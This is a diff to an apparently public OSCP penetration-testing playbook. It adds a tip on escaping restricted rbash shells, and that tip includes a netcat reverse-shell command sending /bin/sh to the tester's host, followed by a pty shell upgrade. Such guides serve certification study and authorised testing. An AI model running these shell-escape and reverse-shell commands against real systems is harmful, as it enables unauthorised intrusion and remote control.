@@ -7,7 +7,7 @@
   \ \_/ /\__/ / \__/\| |     /\__/ / |_| | |   \ V /| |\ V / (_| | | | |_\ \ |_| | | (_| |  __/
    \___/\____/ \____/\_|     \____/ \__,_|_|    \_/ |_| \_/ \__,_|_|  \____/\__,_|_|\__,_|\___|
 </pre>
-Kali Linux Offensive Security Certified Professional Survival Exam Guide Playbook
+Kali Linux Offensive Security Certified Professional Playbook
  _**`NOTE: This document reffers to the target ip as the export variable $ip.  To set this value on the command line use the following syntax:
 export ip=192.168.1.100`**_  
 
@@ -825,6 +825,18 @@ Shells
          You should almost always upgrade your shell after taking control of an apache or www user.
         (For example when you encounter an error message when trying to run an exploit sh: no job control in this shell )
         (hint: sudo -l to see what you can run)
+        
+     -   You may encounter limited shells that use rbash and only allow you to execute a single command per session.
+         You can overcome this by executing an SSH shell to your localhost:
+         
+         `ssh user@$ip nc $localip 4444 -e /bin/sh`
+         
+         `enter user's password`
+         
+         `python -c 'import pty; pty.spawn("/bin/sh")'`
+         
+         `export TERM=linux`
+         
 
      -   python -c 'import pty; pty.spawn("/bin/sh")'
 
